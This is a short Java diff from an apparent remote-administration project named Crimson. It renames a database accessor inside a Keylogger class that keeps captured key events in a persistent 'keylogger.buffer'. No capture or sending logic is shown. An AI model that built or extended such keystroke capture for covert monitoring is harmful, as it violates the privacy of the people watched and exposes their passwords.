@@ -36,7 +36,7 @@ import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.util.Native;
-import com.subterranean_security.crimson.universal.stores.Database;
+import com.subterranean_security.crimson.universal.stores.DatabaseStore;
 
 public final class Keylogger {
 
@@ -82,8 +82,8 @@ public final class Keylogger {
 		log.info("Starting keylogger");
 
 		try {
-			diskBuffer = (MemList<EV_KEvent>) Database.getFacility().getObject("keylogger.buffer");
-			diskBuffer.setDatabase(Database.getFacility());
+			diskBuffer = (MemList<EV_KEvent>) DatabaseStore.getDatabase().getObject("keylogger.buffer");
+			diskBuffer.setDatabase(DatabaseStore.getDatabase());
 		} catch (Exception e) {
 			log.error("Failed to initialize persistent key buffer");
 		}
